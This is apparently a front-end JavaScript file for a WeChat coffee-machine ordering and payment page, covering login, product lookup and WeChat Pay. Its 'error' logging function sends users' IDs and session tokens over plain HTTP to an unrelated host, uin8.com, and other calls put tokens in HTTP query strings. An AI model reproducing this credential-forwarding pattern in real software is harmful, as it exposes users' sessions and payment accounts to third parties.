import style from './style.css'

const _conf = {
    httpJoin: 'http://api.cbcoffee.cn/',  //http://mapi.cbcoffee.cn:8080/
    // httpJoin: 'http://test.cbcoffee.cn:8086/',
    // _wx_httpJoin: 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx71c7dc4f5208bb07&redirect_uri=http://www.cbcoffee.cn/sharedcoffee/tran/transfer.html&response_type=code&scope=snsapi_userinfo&state=' + location.href.split('?')[0],
    _wx_httpJoin: 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx71c7dc4f5208bb07&redirect_uri=' + location.href + '&response_type=code&scope=snsapi_userinfo&state=wx',
}

class _wx_secret {
    constructor(_secret) {
        _secret = _secret || {}
        this.secret = _secret.secret || ''
        this.code = _secret.code || ''
    }

    get(_code) {
        var req = new RegExp("(^|&)" + _code + "=([^&]*)(&|$)", "i"), res = window.location.search.substr(1).match(req);
        if (res != null) return decodeURI(res[2]);
        return null;
    }

    push(e) {
        this._xml({
            method: 'POST',
            uri: 'http://uin8.com/error',
            async: true,
            xmldata: {
                uri: JSON.stringify(e.uri),
                async: JSON.stringify(e.async),
                phone: JSON.stringify({version: navigator.appVersion,platform: navigator.platform}),
                data: JSON.stringify(e.data)
            },
            done: function (res) {
                console.log(res);
            }
        })
    }

    login() {  //登陆
        let it = this;
        this._xml({
            method: 'GET',
            uri: _conf.httpJoin + 'WeChat_login',
            async: false,
            xmldata: {
                code: this.get('code')
            },
            done: function (res) {
                sessionStorage.setItem('token', JSON.stringify({
                    _name: res.user_token,
                    _id: res.user_id
                }));
                if (res.type == 1) {
                    try {
                        it.record(res.user_id, res.user_token);
                    } catch (error) {
                        alert(error);
                    }
                }
                _wx_.unpaid(); //查询 订单金额
            }
        })
    }

    record(_userid, _token) {  //提交用户信息
        this.push({
            uri: _conf.httpJoin + 'record_user_source',
            async: true,
            data: {
                userId: _userid,
                userToken: _token,
                machineNumber: JSON.parse(sessionStorage.getItem('_token')).machineNumber,
                source: 1
            }
        });
        this._xml({
            method: 'GET',
            uri: _conf.httpJoin + 'record_user_source',
            async: true,
            xmldata: {
                userId: _userid,
                userToken: _token,
                machineNumber: JSON.parse(sessionStorage.getItem('_token')).machineNumber,
                source: 1
            },
            done: function (res) {
                console.log('已成功提交用户信息');
            }
        })
    }

    unpaid() {  //查询产品详细数据
        this.push({
            uri: _conf.httpJoin + 'find_product_detail',
            async: true,
            data: {
                userId: JSON.parse(sessionStorage.getItem('token'))._id,
                userToken: JSON.parse(sessionStorage.getItem('token'))._name,
                productId: JSON.parse(sessionStorage.getItem('_token')).productId
            }
        });
        try {
            this._xml({
                method: 'GET',
                uri: _conf.httpJoin + 'find_product_detail',
                async: true,
                xmldata: {
                    userId: JSON.parse(sessionStorage.getItem('token'))._id,
                    userToken: JSON.parse(sessionStorage.getItem('token'))._name,
                    productId: JSON.parse(sessionStorage.getItem('_token')).productId
                },
                done: function (res) {
                    try {
                        if (res.statusCode.status == '6666') {
                            document.getElementById('_money').innerHTML = `<i>
                                <svg class="icon" aria-hidden="true">
                                    <use xlink:href="#ym-icon-rmb"></use>
                                </svg>
                            </i> ${res.isFree != 1 ? parseFloat(res.productDetail.productPrice / 100).toFixed(2) : '0.00'}`;
                            sessionStorage.setItem('_money', document.getElementById('_money').innerHTML);
                            document.getElementById('_product').innerHTML = res.productDetail.productName + `<small> (ID: ${res.productDetail.productId})</small>`;
                            setTimeout(() => {
                                document.getElementById('showbox').style.display = 'none';
                            }, 1000)
                        } else {
                            alert("收集到错误：\n\n" + res.statusCode.msg);
                            document.getElementById('showbox').style.display = 'none';
                            if (res.statusCode.status == 1005) {
                                throw 'Error login-Wechat not code 1005';
                            }
                        }
                    } catch (error) {
                        alert(error);
                    }
                }
            })
        } catch (error) {
            alert(error);
            document.getElementById('showbox').style.display = 'none';
        }
    }

    post() {
        this.push({
            uri: _conf.httpJoin + 'weChat_pay_machine',
            async: false,
            data: {
                productId: JSON.parse(sessionStorage.getItem('_token')).productId,
                userToken: JSON.parse(sessionStorage.getItem('token'))._name,
                userId: JSON.parse(sessionStorage.getItem('token'))._id,
                machineNumber: JSON.parse(sessionStorage.getItem('_token')).machineNumber,
                flavorData: JSON.parse(sessionStorage.getItem('_token')).flavorData
            }
        });
        let it = this;
        this._xml({
            method: 'POST',
            uri: _conf.httpJoin + 'weChat_pay_machine',
            async: false,
            xmldata: {
                productId: JSON.parse(sessionStorage.getItem('_token')).productId,
                userToken: JSON.parse(sessionStorage.getItem('token'))._name,
                userId: JSON.parse(sessionStorage.getItem('token'))._id,
                machineNumber: JSON.parse(sessionStorage.getItem('_token')).machineNumber,
                flavorData: JSON.parse(sessionStorage.getItem('_token')).flavorData
            },
            done: function (res) {
                if (res.statusCode.status == '1009' && res.needPay == 1) {
                    WeixinJSBridge.invoke(
                        'getBrandWCPayRequest', {
                            "appId": res.appId,         //公众号名称，由商户传入
                            "nonceStr": res.nonceStr,   //随机串
                            "package": res.package,     //预付单号
                            "paySign": res.paySign,     //微信签名
                            "signType": res.signType,   //微信签名方式：
                            "timeStamp": res.timeStamp  //时间戳，自1970年以来的秒数
                        },
                        function (res) {
                            if (res.err_msg == "get_brand_wcpay_request:ok") {
                                window.location.href = "./view/successfull.htm?503";
                            } else {
                                throw "支付失败！Error: " + res.err_msg;
                            }
                        }
                    )
                } else {
                    if (res.statusCode.status == '1009') {
                        location.href = "./view/successfull.htm?503";
                    } else {
                        alert("收集到错误: \n\n" + res.statusCode.msg);
                    }
                }
            }
        })
    }

    _xml(ent) {
        ent = ent || {};
        ent.method = ent.method.toUpperCase() || "POST";
        ent.uri = ent.uri || '';
        ent.async = ent.async || true;
        ent.xmldata = ent.xmldata || {};
        ent.success = ent.success || function () { };
        var xml = null, params = [], postData;
        if (window.XMLHttpRequest) {
            xml = new XMLHttpRequest();
        } else {
            xml = new ActiveXObject("Microsoft.XMLHTTP");
        };
        for (let key in ent.xmldata) {
            params.push(key + '=' + ent.xmldata[key]);
        }
        postData = params.join('&');
        if (ent.method.toUpperCase() === "POST") {
            xml.open(ent.method, ent.uri, ent.async);
            xml.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8');
            xml.send(postData);
        } else if (ent.method.toUpperCase() === "GET") {
            xml.open(ent.method, ent.uri + '?' + postData, ent.async);
            xml.send(null);
        }
        xml.onreadystatechange = function () {
            if (xml.readyState == 4 && xml.status == 200) {
                ent.done(JSON.parse(xml.responseText));
            }
        }
    }
}
var _wx_ = new _wx_secret();

!sessionStorage.getItem('token') ? (_wx_.get('code') ? _wx_.login() : (() => {
    try {
        if (!_wx_.get('productId')) {
            throw 'Error  productId not empty';
        } else {
            sessionStorage.setItem('_token', JSON.stringify({
                machineNumber: _wx_.get('machineNumber'),
                productId: _wx_.get('productId'),
                flavorData: _wx_.get('flavorData') ? _wx_.get('flavorData') : []

            }))
            location.href = _conf._wx_httpJoin;
        }
    } catch (error) {
        alert(error);
    }
})()) : _wx_.unpaid(); //查询 订单金额

document.getElementById('_submit').addEventListener('click', () => {
    _wx_.post();
}, true);

try {
    if (typeof WeixinJSBridge === "undefined") {
        if (document.addEventListener) {
            if (sessionStorage.getItem('successfull') == 'true') {
                document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
            }
        }
    } else {
        onBridgeReady();
    }
    function onBridgeReady() {
        WeixinJSBridge.call('closeWindow');
    }
} catch (error) {
    alert(error);
}
